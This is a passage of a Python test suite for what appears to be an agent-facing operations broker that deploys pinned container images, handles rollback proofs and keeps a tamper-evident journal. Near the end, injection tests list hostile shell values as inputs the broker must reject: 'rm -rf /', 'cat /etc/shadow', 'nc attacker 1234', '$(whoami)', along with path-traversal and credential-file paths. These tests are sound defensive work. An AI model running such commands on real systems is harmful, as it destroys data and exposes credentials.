                    return 0, "LISTEN 0 4096 127.0.0.1:3100 0.0.0.0:*\n", ""
                if args[:3] == ["docker", "container", "inspect"]:
                    bound = approved_path.read_text().strip()
                    immutable = drift_id if drift_after_restart and restart_count else prior_id
                    return 0, f"true\t{bound}\t{immutable}\n", ""
                if args[:3] == ["docker", "image", "inspect"]:
                    reference = args[-1]
                    immutable = drift_id if drift_after_restart and restart_count else prior_id
                    return 0, f'{immutable}\t["{reference}"]\t{"d" * 40}\n', ""
                if args[:2] == ["docker", "pull"]:
                    return 0, "", ""
                if args[0] == "curl":
                    url = args[-1]
                    if "events/ws" in url:
                        body, status, content_type = "", 401, "application/json"
                    elif url.endswith("/api/health"):
                        body, status, content_type = '{"status":"ok"}', 200, "application/json"
                    elif url.endswith("/api/companies"):
                        body, status, content_type = "{}", 401, "application/json"
                    else:
                        body, status, content_type = '<div id="root"></div>', 200, "text/html"
                    return 0, f"{body}\n{broker.HTTP_PROBE_MARKER}{status}\t{content_type}", ""
                raise AssertionError(f"unexpected command: {args}")

            connection = broker.connect_database()
            with patch.object(broker, "run_command", side_effect=command), patch.object(
                broker,
                "_deploy_checkpoint",
                side_effect=lambda phase: (
                    (_ for _ in ()).throw(RuntimeError("injected after first pin"))
                    if phase == "runtime-env-written"
                    else None
                ),
            ):
                response = self.socket_request(request, connection)
            connection.close()

            self.assertFalse(response["ok"])
            fresh = broker.connect_database()
            receipt = broker.list_receipts(fresh)[0]
            expected_state = "reconciliation_required" if drift_after_restart else "failed"
            self.assertEqual(receipt["state"], expected_state)
            self.assertTrue(receipt["evidence"]["configurationRestored"])
            self.assertEqual(
                receipt["evidence"]["priorReleaseMatches"], not drift_after_restart,
            )
            self.assertEqual(
                receipt["evidence"]["priorRestorationProved"], not drift_after_restart,
            )
            self.assertEqual(restart_count, 1)
            for path in (runtime_path, approved_path):
                self.assertEqual(
                    (path.read_bytes(), path.stat().st_uid, path.stat().st_gid, path.stat().st_mode & 0o777),
                    before[path.name],
                )
            with patch.object(broker, "run_command") as replay_effects:
                replay = self.socket_request(request, fresh)
            self.assertTrue(replay["ok"])
            self.assertTrue(replay["data"]["replayed"])
            replay_effects.assert_not_called()
            fresh.close()

    def test_deploy_front_door_failure_restores_and_proves_previous_release(self):
        with self.paths():
            connection = broker.connect_database()
            image = "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "a" * 64
            previous_env = (self.config / "runtime.env").read_text()
            previous_pin = (self.config / "approved-image").read_text()
            mock_results = [
                (0, "", ""),          # docker pull
                (0, "", ""),          # restart candidate
                (0, "active\n", ""),  # candidate systemctl health
                (0, "", ""),          # rollback restart
                (0, "active\n", ""),  # rollback systemctl health
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                with patch.object(
                    broker, "_front_door_health",
                    return_value={
                        "healthy": False,
                        "probes": [{"name": "public-browser", "passed": False}],
                    },
                ):
                    with patch.object(
                        broker, "_image_binding_evidence",
                        return_value={"proofComplete": True},
                    ):
                        with patch.object(
                            broker, "_safe_rollback_terminal_evidence",
                            return_value=self.release_proof(),
                        ):
                            with self.assertRaisesRegex(
                                broker.BrokerError,
                                "prior release restoration proved",
                            ):
                                broker.process_request({
                                    "operation": "deploy-pinned-image",
                                    "service": "paperclip-gloops.service",
                                    "image": image,
                                    "sourceCommit": "d" * 40,
                                    "actor": "wren-agent",
                                    "idempotencyKey": "deploy-front-door-rollback-001",
                                }, connection=connection)
            self.assertEqual((self.config / "runtime.env").read_text(), previous_env)
            self.assertEqual((self.config / "approved-image").read_text(), previous_pin)
            receipts = broker.list_receipts(connection)
            self.assertEqual(receipts[0]["state"], "failed")
            self.assertTrue(receipts[0]["evidence"]["priorRestorationProved"])
            connection.close()

    def test_deploy_rejects_matching_config_with_mismatched_immutable_id(self):
        with self.paths():
            connection = broker.connect_database()
            image = "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "a" * 64
            running_id = "sha256:" + "b" * 64
            expected_id = "sha256:" + "c" * 64
            mock_results = [
                (0, "", ""),  # docker pull
                (0, "", ""),  # restart candidate
                (0, "active\n", ""),  # candidate systemctl health
                (0, f"true\t{image}\t{running_id}\n", ""),  # container inspect
                (0, f'{expected_id}\t["{image}"]\n', ""),  # image inspect
                (0, "", ""),  # rollback restart
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                with patch.object(
                    broker, "_front_door_health",
                    return_value={"healthy": True, "probes": []},
                ):
                    with patch.object(
                        broker, "_safe_rollback_terminal_evidence",
                        return_value=self.release_proof(),
                    ):
                        with self.assertRaisesRegex(
                            broker.BrokerError,
                            "prior release restoration proved",
                        ):
                            broker.process_request({
                                "operation": "deploy-pinned-image",
                                "service": "paperclip-gloops.service",
                                "image": image,
                                "sourceCommit": "d" * 40,
                                "actor": "wren-agent",
                                "idempotencyKey": "deploy-wrong-id-001",
                            }, connection=connection)
            receipt = broker.list_receipts(connection)[0]
            image_binding = receipt["evidence"]["postImageBinding"]
            self.assertEqual(receipt["state"], "failed")
            self.assertTrue(image_binding["configuredReferenceMatches"])
            self.assertFalse(image_binding["immutableImageIdMatches"])
            self.assertFalse(image_binding["proofComplete"])
            self.assertTrue(receipt["evidence"]["priorRestorationProved"])
            connection.close()

    def test_deploy_restart_failure_restores_previous_release_pin(self):
        with self.paths():
            connection = broker.connect_database()
            image = "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "a" * 64
            previous_env = (self.config / "runtime.env").read_text()
            previous_pin = (self.config / "approved-image").read_text()
            mock_results = [
                (0, "", ""),  # docker pull
                (1, "", "new release failed"),  # systemctl restart
                (0, "", ""),  # rollback restart
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                with patch.object(
                    broker, "_safe_rollback_terminal_evidence",
                    return_value=self.release_proof(),
                ):
                    with self.assertRaisesRegex(
                        broker.BrokerError,
                        "prior release restoration proved",
                    ):
                        broker.process_request({
                            "operation": "deploy-pinned-image",
                            "service": "paperclip-gloops.service",
                            "image": image,
                            "sourceCommit": "d" * 40,
                            "actor": "wren-agent",
                            "idempotencyKey": "deploy-rollback-001",
                        }, connection=connection)
        self.assertEqual((self.config / "runtime.env").read_text(), previous_env)
        self.assertEqual((self.config / "approved-image").read_text(), previous_pin)
        connection.close()

    def test_socket_deploy_failure_commits_receipt_and_replay_has_no_effects(self):
        with self.paths():
            image = "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "a" * 64
            request = {
                "operation": "deploy-pinned-image",
                "service": "paperclip-gloops.service",
                "image": image,
                "sourceCommit": "d" * 40,
                "actor": "wren-agent",
                "idempotencyKey": "deploy-socket-durable-failure-001",
            }
            previous_env = (self.config / "runtime.env").read_text()
            previous_pin = (self.config / "approved-image").read_text()
            connection = broker.connect_database()
            mock_results = [
                (0, "", ""),  # docker pull
                (1, "", "new release failed"),  # candidate restart
                (0, "", ""),  # rollback restart
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                with patch.object(
                    broker,
                    "_safe_rollback_terminal_evidence",
                    return_value=self.release_proof(),
                ):
                    response = self.socket_request(request, connection)
            connection.close()

            self.assertFalse(response["ok"])
            self.assertIn("prior release restoration proved", response["error"])
            self.assertEqual((self.config / "runtime.env").read_text(), previous_env)
            self.assertEqual((self.config / "approved-image").read_text(), previous_pin)

            fresh = broker.connect_database()
            receipts = broker.list_receipts(fresh)
            self.assertEqual(len(receipts), 1)
            self.assertEqual(receipts[0]["state"], "failed")
            self.assertEqual(receipts[0]["idempotencyKey"], request["idempotencyKey"])
            self.assertTrue(receipts[0]["evidence"]["priorRestorationProved"])
            states = [
                row["state"]
                for row in fresh.execute("SELECT state FROM journal ORDER BY sequence")
            ]
            self.assertEqual(states, ["initiated", "failed"])
            broker.verify_journal(fresh)

            with patch.object(broker, "run_command") as replay_command:
                replay = self.socket_request(request, fresh)
            self.assertTrue(replay["ok"])
            self.assertTrue(replay["data"]["replayed"])
            self.assertEqual(replay["data"]["state"], "failed")
            replay_command.assert_not_called()
            fresh.close()

    def test_socket_deploy_exceptions_after_every_mutation_boundary_compensate(self):
        cases = [
            ("runtime-env-written", "checkpoint"),
            ("approved-image-written", "checkpoint"),
            ("candidate-restart-returned", "checkpoint"),
            ("post-service-health", "checkpoint"),
            ("post-front-door-health", "checkpoint"),
            ("post-image-binding", "checkpoint"),
            ("candidate-restart-timeout", "restart-timeout"),
            ("candidate-restart-command-missing", "restart-missing"),
            ("post-service-health-exception", "service-health"),
            ("post-front-door-health-exception", "front-door"),
            ("post-image-binding-exception", "image-binding"),
        ]
        for index, (label, mode) in enumerate(cases):
            with self.subTest(label=label), self.paths():
                image = "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "a" * 64
                request = {
                    "operation": "deploy-pinned-image",
                    "service": "paperclip-gloops.service",
                    "image": image,
                    "sourceCommit": "d" * 40,
                    "actor": "wren-agent",
                    "idempotencyKey": f"deploy-boundary-{index}",
                }
                previous_env = (self.config / "runtime.env").read_text()
                previous_pin = (self.config / "approved-image").read_text()
                connection = broker.connect_database()
                state = {"calls": [], "restartCount": 0}
                restart_failure = {
                    "restart-timeout": "timeout",
                    "restart-missing": "missing",
                }.get(mode)
                command = self.real_release_command(
                    state, restart_failure=restart_failure,
                )
                original_service_health = broker._check_service_active
                original_front_door = broker._front_door_health
                original_image_binding = broker._image_binding_evidence

                def service_health(service):
                    if (
                        mode == "service-health"
                        and (self.config / "approved-image").read_text().strip().endswith("a" * 64)
                        and not state.get("serviceHealthFailed")
                    ):
                        state["serviceHealthFailed"] = True
                        raise RuntimeError("injected service health failure")
                    return original_service_health(service)

                def front_door(service):
                    if (
                        mode == "front-door"
                        and (self.config / "approved-image").read_text().strip().endswith("a" * 64)
                        and not state.get("frontDoorFailed")
                    ):
                        state["frontDoorFailed"] = True
                        raise RuntimeError("injected front door failure")
                    return original_front_door(service)

                def image_binding(container, expected_image, **kwargs):
                    if (
                        mode == "image-binding"
                        and expected_image.endswith("a" * 64)
                        and not state.get("imageBindingFailed")
                    ):
                        state["imageBindingFailed"] = True
                        raise RuntimeError("injected image binding failure")
                    return original_image_binding(container, expected_image, **kwargs)

                with ExitStack() as stack:
                    stack.enter_context(patch.object(broker, "run_command", side_effect=command))
                    if mode == "checkpoint":
                        stack.enter_context(patch.object(
                            broker,
                            "_deploy_checkpoint",
                            side_effect=lambda phase, target=label: (
                                (_ for _ in ()).throw(RuntimeError("injected boundary failure"))
                                if phase == target
                                else None
                            ),
                        ))
                    elif mode == "service-health":
                        stack.enter_context(patch.object(
                            broker,
                            "_check_service_active",
                            side_effect=service_health,
                        ))
                    elif mode == "front-door":
                        stack.enter_context(patch.object(
                            broker,
                            "_front_door_health",
                            side_effect=front_door,
                        ))
                    elif mode == "image-binding":
                        stack.enter_context(patch.object(
                            broker,
                            "_image_binding_evidence",
                            side_effect=image_binding,
                        ))
                    response = self.socket_request(request, connection)
                connection.close()

                self.assertFalse(response["ok"])
                self.assertEqual((self.config / "runtime.env").read_text(), previous_env)
                self.assertEqual((self.config / "approved-image").read_text(), previous_pin)
                self.assertEqual(
                    state["restartCount"],
                    1 if label in {"runtime-env-written", "approved-image-written"} else 2,
                )

                fresh = broker.connect_database()
                receipt = broker.list_receipts(fresh)[0]
                self.assertEqual(receipt["state"], "failed")
                self.assertEqual(receipt["outcome"], "failure")
                self.assertTrue(receipt["evidence"]["configurationRestored"])
                self.assertTrue(receipt["evidence"]["rollbackRestartSucceeded"])
                self.assertTrue(receipt["evidence"]["priorReleaseMatches"])
                self.assertTrue(receipt["evidence"]["priorRestorationProved"])
                self.assertEqual(
                    [row["state"] for row in fresh.execute("SELECT state FROM journal ORDER BY sequence")],
                    ["initiated", "failed"],
                )
                with patch.object(broker, "run_command") as replay_command:
                    replay = self.socket_request(request, fresh)
                self.assertTrue(replay["ok"])
                self.assertTrue(replay["data"]["replayed"])
                self.assertEqual(replay["data"]["state"], "failed")
                replay_command.assert_not_called()
                fresh.close()
                self.db_path.unlink(missing_ok=True)
                Path(str(self.db_path) + "-wal").unlink(missing_ok=True)
                Path(str(self.db_path) + "-shm").unlink(missing_ok=True)

    def test_socket_unproved_compensation_is_durable_reconciliation_required(self):
        with self.paths():
            image = "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "a" * 64
            request = {
                "operation": "deploy-pinned-image",
                "service": "paperclip-gloops.service",
                "image": image,
                "sourceCommit": "d" * 40,
                "actor": "wren-agent",
                "idempotencyKey": "deploy-reconciliation-required-001",
            }
            connection = broker.connect_database()
            with patch.object(
                broker,
                "run_command",
                side_effect=[(0, "", ""), (1, "", "candidate failed"), (1, "", "rollback failed")],
            ), patch.object(
                broker,
                "_safe_rollback_terminal_evidence",
                return_value={
                    "proofComplete": False,
                    "schemaVersion": "gloops.rollback-proof.v1",
                    "error": "rollback restart failed before terminal proof",
                },
            ):
                response = self.socket_request(request, connection)
            connection.close()
            self.assertFalse(response["ok"])
            self.assertIn("requires reconciliation", response["error"])

            fresh = broker.connect_database()
            receipt = broker.list_receipts(fresh)[0]
            self.assertEqual(receipt["state"], "reconciliation_required")
            self.assertEqual(receipt["outcome"], "unknown")
            self.assertTrue(receipt["evidence"]["configurationRestored"])
            self.assertFalse(receipt["evidence"]["priorRestorationProved"])
            self.assertEqual(
                [row["state"] for row in fresh.execute("SELECT state FROM journal ORDER BY sequence")],
                ["initiated", "reconciliation_required"],
            )
            with patch.object(broker, "run_command") as replay_command:
                replay = self.socket_request(request, fresh)
            self.assertTrue(replay["ok"])
            self.assertEqual(replay["data"]["state"], "reconciliation_required")
            replay_command.assert_not_called()
            fresh.close()

    def test_socket_rollback_proof_exception_requires_reconciliation(self):
        with self.paths():
            image = "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "a" * 64
            request = {
                "operation": "deploy-pinned-image",
                "service": "paperclip-gloops.service",
                "image": image,
                "sourceCommit": "d" * 40,
                "actor": "wren-agent",
                "idempotencyKey": "deploy-rollback-proof-exception-001",
            }
            previous_env = (self.config / "runtime.env").read_text()
            previous_pin = (self.config / "approved-image").read_text()
            connection = broker.connect_database()
            with patch.object(
                broker,
                "run_command",
                side_effect=[(0, "", ""), (1, "", "candidate failed"), (0, "", "")],
            ), patch.object(
                broker,
                "_rollback_terminal_evidence",
                side_effect=RuntimeError("injected rollback proof probe failure"),
            ):
                response = self.socket_request(request, connection)
            connection.close()

            self.assertFalse(response["ok"])
            self.assertIn("requires reconciliation", response["error"])
            self.assertEqual((self.config / "runtime.env").read_text(), previous_env)
            self.assertEqual((self.config / "approved-image").read_text(), previous_pin)

            fresh = broker.connect_database()
            receipt = broker.list_receipts(fresh)[0]
            self.assertEqual(receipt["state"], "reconciliation_required")
            self.assertEqual(receipt["outcome"], "unknown")
            self.assertTrue(receipt["evidence"]["configurationRestored"])
            self.assertTrue(receipt["evidence"]["rollbackRestartSucceeded"])
            self.assertFalse(receipt["evidence"]["priorRestorationProved"])
            self.assertEqual(
                receipt["evidence"]["rollbackProof"]["error"],
                "rollback proof raised RuntimeError",
            )
            self.assertEqual(
                [row["state"] for row in fresh.execute("SELECT state FROM journal ORDER BY sequence")],
                ["initiated", "reconciliation_required"],
            )
            with patch.object(broker, "run_command") as replay_command:
                replay = self.socket_request(request, fresh)
            self.assertTrue(replay["ok"])
            self.assertEqual(replay["data"]["state"], "reconciliation_required")
            replay_command.assert_not_called()
            fresh.close()

    def test_socket_unexpected_fault_retains_initiated_reservation_after_restart(self):
        with self.paths():
            request = {
                "operation": "service-restart",
                "service": "paperclip-gloops.service",
                "actor": "wren-agent",
                "idempotencyKey": "restart-crash-reservation-001",
            }
            connection = broker.connect_database()
            with patch.object(
                broker,
                "run_command",
                side_effect=[(0, "active\n", ""), RuntimeError("simulated crash")],
            ):
                response = self.socket_request(request, connection)
            connection.close()

            self.assertFalse(response["ok"])
            self.assertIn("internal error", response["error"])

            fresh = broker.connect_database()
            receipts = broker.list_receipts(fresh)
            self.assertEqual(len(receipts), 1)
            self.assertEqual(receipts[0]["state"], "initiated")
            states = [
                row["state"]
                for row in fresh.execute("SELECT state FROM journal ORDER BY sequence")
            ]
            self.assertEqual(states, ["initiated"])

            with patch.object(broker, "run_command") as replay_command:
                replay = self.socket_request(request, fresh)
            self.assertTrue(replay["ok"])
            self.assertTrue(replay["data"]["replayed"])
            self.assertEqual(replay["data"]["state"], "initiated")
            replay_command.assert_not_called()
            fresh.close()

    def test_deploy_pinned_image_rejects_service_without_image_env(self):
        with self.paths():
            connection = broker.connect_database()
            image = "ghcr.io/gloopsai/test@sha256:" + "b" * 64
            with self.assertRaisesRegex(broker.BrokerError, "does not support image deployment"):
                broker.process_request({
                    "operation": "deploy-pinned-image",
                    "service": "paperclip-github-push-broker.service",
                    "image": image,
                    "sourceCommit": "d" * 40,
                    "actor": "wren-agent",
                    "idempotencyKey": "deploy-003",
                }, connection=connection)
            connection.close()

    def test_rollback_rehearsal_creates_receipt(self):
        with self.paths():
            connection = broker.connect_database()
            backup_dir = self.dir / "backups"
            backup_dir.mkdir(parents=True)
            (backup_dir / "2026-01-01").mkdir()
            with patch.object(broker, "BACKUP_DIR", backup_dir), patch.object(Path, "exists", return_value=True):
                with patch("os.access", return_value=True):
                    result = broker.process_request({
                        "operation": "rollback-rehearsal",
                        "service": "paperclip-gloops.service",
                        "actor": "wren-agent",
                        "idempotencyKey": "rollback-001",
                    }, connection=connection)
        self.assertTrue(result["ok"])
        self.assertEqual(result["data"]["state"], "completed")
        self.assertTrue(result["data"]["evidence"]["rollbackScriptExists"])
        self.assertTrue(result["data"]["evidence"]["rollbackScriptExecutable"])
        connection.close()

    def test_rollback_absence_proof_receipts_listener_and_artifact_absence(self):
        with self.paths():
            connection = broker.connect_database()
            mock_results = [
                (3, "inactive\n", ""),
                (0, "", ""),
                (1, "", "Error: No such container: paperclip-gloops"),
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                result = broker.process_request({
                    "operation": "rollback-proof",
                    "service": "paperclip-gloops.service",
                    "mode": "absent",
                    "actor": "wren-agent",
                    "idempotencyKey": "rollback-absence-001",
                }, connection=connection)
        evidence = result["data"]["evidence"]
        self.assertTrue(evidence["proofComplete"])
        self.assertTrue(evidence["listenerAbsenceProved"])
        self.assertTrue(evidence["runtimeArtifactAbsenceProved"])
        connection.close()

    def test_rollback_absence_proof_fails_closed_when_listener_remains(self):
        with self.paths():
            connection = broker.connect_database()
            mock_results = [
                (3, "inactive\n", ""),
                (0, "LISTEN 0 4096 127.0.0.1:3100 0.0.0.0:*\n", ""),
                (1, "", "Error: No such container: paperclip-gloops"),
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                with self.assertRaisesRegex(broker.BrokerError, "terminal proof failed"):
                    broker.process_request({
                        "operation": "rollback-proof",
                        "service": "paperclip-gloops.service",
                        "mode": "absent",
                        "actor": "wren-agent",
                        "idempotencyKey": "rollback-absence-listener-001",
                    }, connection=connection)
            receipt = broker.list_receipts(connection)[0]
            self.assertEqual(receipt["state"], "failed")
            self.assertFalse(receipt["evidence"]["listenerAbsenceProved"])
            with patch.object(broker, "run_command", side_effect=[]):
                replay = broker.process_request({
                    "operation": "rollback-proof",
                    "service": "paperclip-gloops.service",
                    "mode": "absent",
                    "actor": "wren-agent",
                    "idempotencyKey": "rollback-absence-listener-001",
                }, connection=connection)
            self.assertTrue(replay["ok"])
            self.assertTrue(replay["data"]["replayed"])
            self.assertEqual(replay["data"]["state"], "failed")
            connection.close()

    def test_rollback_restoration_proof_binds_prior_image_and_front_door(self):
        with self.paths():
            connection = broker.connect_database()
            previous = "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "1" * 64
            image_id = "sha256:" + "a" * 64
            mock_results = [
                (0, "active\n", ""),
                (0, "LISTEN 0 4096 127.0.0.1:3100 0.0.0.0:*\n", ""),
                (0, f"true\t{previous}\t{image_id}\n", ""),
                (0, f'{image_id}\t["{previous}"]\n', ""),
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                with patch.object(
                    broker, "_front_door_health",
                    return_value={"healthy": True, "probes": []},
                ):
                    result = broker.process_request({
                        "operation": "rollback-proof",
                        "service": "paperclip-gloops.service",
                        "mode": "restored",
                        "expectedPriorImage": previous,
                        "actor": "wren-agent",
                        "idempotencyKey": "rollback-restored-001",
                    }, connection=connection)
        evidence = result["data"]["evidence"]
        self.assertTrue(evidence["proofComplete"])
        self.assertTrue(evidence["priorRestorationProved"])
        self.assertTrue(all(evidence["imageMatches"].values()))
        connection.close()

    def test_rollback_proof_same_key_rejects_expected_image_drift_without_effects(self):
        with self.paths():
            connection = broker.connect_database()
            previous = "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "1" * 64
            drifted = "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "2" * 64
            image_id = "sha256:" + "a" * 64
            request = {
                "operation": "rollback-proof",
                "service": "paperclip-gloops.service",
                "mode": "restored",
                "expectedPriorImage": previous,
                "actor": "wren-agent",
                "idempotencyKey": "rollback-expected-drift-001",
            }
            with patch.object(broker, "run_command", side_effect=[
                (0, "active\n", ""),
                (0, "LISTEN 0 4096 127.0.0.1:3100 0.0.0.0:*\n", ""),
                (0, f"true\t{previous}\t{image_id}\n", ""),
                (0, f'{image_id}\t["{previous}"]\n', ""),
            ]), patch.object(
                broker, "_front_door_health", return_value={"healthy": True, "probes": []},
            ):
                first = self.socket_request(request, connection)
            self.assertTrue(first["ok"])

            with patch.object(broker, "run_command") as effects, patch.object(
                broker, "_front_door_health",
            ) as front_door_effects:
                rejected = self.socket_request(
                    {**request, "expectedPriorImage": drifted}, connection,
                )
            self.assertFalse(rejected["ok"])
            self.assertIn("different action", rejected["error"])
            effects.assert_not_called()
            front_door_effects.assert_not_called()
            connection.close()

    def test_rollback_restoration_rejects_matching_config_with_mismatched_immutable_id(self):
        with self.paths():
            connection = broker.connect_database()
            previous = "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "1" * 64
            configured_id = "sha256:" + "a" * 64
            expected_id = "sha256:" + "b" * 64
            mock_results = [
                (0, "active\n", ""),
                (0, "LISTEN 0 4096 127.0.0.1:3100 0.0.0.0:*\n", ""),
                (0, f"true\t{previous}\t{configured_id}\n", ""),
                (0, f'{expected_id}\t["{previous}"]\n', ""),
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                with patch.object(
                    broker, "_front_door_health",
                    return_value={"healthy": True, "probes": []},
                ):
                    with self.assertRaisesRegex(broker.BrokerError, "terminal proof failed"):
                        broker.process_request({
                            "operation": "rollback-proof",
                            "service": "paperclip-gloops.service",
                            "mode": "restored",
                            "expectedPriorImage": previous,
                            "actor": "wren-agent",
                            "idempotencyKey": "rollback-restored-wrong-id-001",
                        }, connection=connection)
            receipt = broker.list_receipts(connection)[0]
            evidence = receipt["evidence"]
            self.assertEqual(receipt["state"], "failed")
            self.assertTrue(evidence["imageMatches"]["containerConfiguredImage"])
            self.assertFalse(evidence["imageMatches"]["containerImmutableImageId"])
            self.assertFalse(evidence["proofComplete"])
            connection.close()

    # -------------------------------------------------------------------------
    # Receipt queries
    # -------------------------------------------------------------------------

    def test_list_receipts_returns_empty_initially(self):
        with self.paths():
            connection = broker.connect_database()
            result = broker.process_request({
                "operation": "list-receipts",
            }, connection=connection)
        self.assertTrue(result["ok"])
        self.assertEqual(result["data"]["receipts"], [])
        connection.close()

    def test_get_receipt_returns_none_for_missing(self):
        with self.paths():
            connection = broker.connect_database()
            with self.assertRaisesRegex(broker.BrokerError, "not found"):
                broker.process_request({
                    "operation": "get-receipt",
                    "receiptId": "nonexistent",
                }, connection=connection)
            connection.close()

    def test_list_receipts_after_restart(self):
        with self.paths():
            connection = broker.connect_database()
            mock_results = [
                (0, "active\n", ""),
                (0, "", ""),
                (0, "active\n", ""),
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                broker.process_request({
                    "operation": "service-restart",
                    "service": "paperclip-gloops.service",
                    "actor": "wren-agent",
                    "idempotencyKey": "list-001",
                }, connection=connection)
            result = broker.process_request({
                "operation": "list-receipts",
            }, connection=connection)
        self.assertTrue(result["ok"])
        self.assertEqual(len(result["data"]["receipts"]), 1)
        self.assertEqual(result["data"]["receipts"][0]["operation"], "service-restart")
        connection.close()

    # -------------------------------------------------------------------------
    # Journal hash chain integrity
    # -------------------------------------------------------------------------

    def test_journal_hash_chain_is_valid_after_operations(self):
        with self.paths():
            connection = broker.connect_database()
            mock_results = [
                (0, "active\n", ""),
                (0, "", ""),
                (0, "active\n", ""),
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                broker.process_request({
                    "operation": "service-restart",
                    "service": "paperclip-gloops.service",
                    "actor": "wren-agent",
                    "idempotencyKey": "journal-001",
                }, connection=connection)
            # Verify journal is valid
            broker.verify_journal(connection)
            connection.close()

    def test_journal_hash_chain_detects_tampering(self):
        with self.paths():
            connection = broker.connect_database()
            mock_results = [
                (0, "active\n", ""),
                (0, "", ""),
                (0, "active\n", ""),
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                result = broker.process_request({
                    "operation": "service-restart",
                    "service": "paperclip-gloops.service",
                    "actor": "wren-agent",
                    "idempotencyKey": "journal-002",
                }, connection=connection)
            # Tamper with the returned receiptId in the journal
            receipt_id = result["data"]["receiptId"]
            connection.execute(
                "UPDATE journal SET payload_json = ? WHERE receipt_id = ?",
                (json.dumps({"tampered": True}), receipt_id),
            )
            connection.commit()
            with self.assertRaisesRegex(broker.BrokerError, "hash chain is invalid"):
                broker.verify_journal(connection)
            connection.close()

    # -------------------------------------------------------------------------
    # Bounded output
    # -------------------------------------------------------------------------

    def test_bounded_output_truncates_large_lists(self):
        large_list = [{"number": i} for i in range(10000)]
        response = {"ok": True, "data": large_list}
        raw = broker.bound_output(response, max_bytes=2048)
        self.assertLessEqual(len(raw), 2048)
        parsed = json.loads(raw)
        self.assertTrue(parsed.get("truncated", False))

    def test_bounded_output_keeps_small_responses(self):
        response = {"ok": True, "data": [{"number": 1}]}
        raw = broker.bound_output(response, max_bytes=8192)
        parsed = json.loads(raw)
        self.assertFalse(parsed.get("truncated", False))

    # -------------------------------------------------------------------------
    # Credential non-disclosure
    # -------------------------------------------------------------------------

    def test_strip_credentials_removes_sensitive_keys(self):
        data = {
            "number": 1,
            "token": "secret",
            "nested": {"api_key": "secret", "value": 2},
            "list": [{"password": "secret", "number": 3}],
        }
        stripped = broker.strip_credentials(data)
        self.assertNotIn("token", stripped)
        self.assertNotIn("api_key", stripped["nested"])
        self.assertNotIn("password", stripped["list"][0])
        self.assertEqual(stripped["number"], 1)

    # -------------------------------------------------------------------------
    # Malformed request rejection
    # -------------------------------------------------------------------------

    def test_rejects_unknown_operation(self):
        with self.paths():
            with self.assertRaisesRegex(broker.BrokerError, "operation must be one of"):
                broker.process_request({"operation": "delete-everything"})

    def test_rejects_missing_operation(self):
        with self.paths():
            with self.assertRaisesRegex(broker.BrokerError, "operation must be one of"):
                broker.process_request({"service": "paperclip-gloops.service"})

    def test_rejects_non_object_request(self):
        with self.paths():
            mock_socket = MagicMock()
            mock_socket.recv = lambda n: b"[1, 2, 3]\n"
            with self.assertRaisesRegex(broker.BrokerError, "JSON object"):
                broker.read_request(mock_socket)

    def test_disconnected_client_does_not_crash_broker_after_response(self):
        """A caller timeout must not kill the long-lived broker process."""
        with self.paths():
            connection = broker.connect_database()
            mock_socket = MagicMock()
            mock_socket.recv = lambda _size: b'{"operation":"memory-usage"}\n'
            mock_socket.sendall.side_effect = BrokenPipeError("caller timed out")
            with patch.object(
                broker,
                "op_memory_usage",
                return_value={"totalBytes": 1, "availableBytes": 1},
            ):
                broker.handle_connection(mock_socket, connection)
            connection.close()

    # -------------------------------------------------------------------------
    # No generic shell/SSH/sudo/path/service/image-tag injection
    # -------------------------------------------------------------------------

    def test_image_must_be_pinned_digest_not_tag(self):
        with self.paths():
            connection = broker.connect_database()
            for bad_image in [
                "myimage:latest",
                "myimage:v1.0",
                "sha256:abc",
                "just-a-string",
                "",
            ]:
                with self.assertRaisesRegex(broker.BrokerError, "pinned digest"):
                    broker.process_request({
                        "operation": "deploy-pinned-image",
                        "service": "paperclip-gloops.service",
                        "image": bad_image,
                        "sourceCommit": "d" * 40,
                        "actor": "wren-agent",
                        "idempotencyKey": f"inject-{bad_image[:20]}",
                    }, connection=connection)
            connection.close()

    def test_service_name_cannot_inject_shell_metacharacters(self):
        with self.paths():
            for bad_service in [
                "paperclip-glops.service; rm -rf /",
                "paperclip-glops.service && cat /etc/shadow",
                "paperclip-glops.service | nc attacker 1234",
                "$(whoami).service",
                "paperclip-glops.service`whoami`",
            ]:
                with self.assertRaisesRegex(broker.BrokerError, "systemd unit name"):
                    broker.process_request({
                        "operation": "service-status",
                        "service": bad_service,
                    })

    def test_cache_name_cannot_traverse_to_arbitrary_path(self):
        with self.paths():
            with self.assertRaisesRegex(broker.BrokerError, "not in the allowlist"):
                broker.process_request({
                    "operation": "cache-inspect",
                    "cache": "../../../etc/shadow",
                })

    def test_disk_usage_cannot_access_arbitrary_paths(self):
        with self.paths():
            for bad_path in [
                "/etc/shadow",
                "/root/.ssh",
                "/proc/1/environ",
                "/var/lib/paperclip-gloops/github-push-broker",
            ]:
                with self.assertRaisesRegex(broker.BrokerError, "not allowed for disk usage"):
                    broker.process_request({
                        "operation": "disk-usage",
                        "path": bad_path,
                    })

    # -------------------------------------------------------------------------
    # Verify that mutating operations without DB connection fail
    # -------------------------------------------------------------------------

    def test_mutating_operation_without_connection_fails(self):
        with self.paths():
            with self.assertRaisesRegex(broker.BrokerError, "database connection"):
                broker.process_request({
                    "operation": "service-restart",
                    "service": "paperclip-gloops.service",
                    "actor": "wren-agent",
                    "idempotencyKey": "no-db-001",
                })

    # -------------------------------------------------------------------------
    # Allowlist loading
    # -------------------------------------------------------------------------

    def test_allowlist_missing_file_raises(self):
        with self.paths():
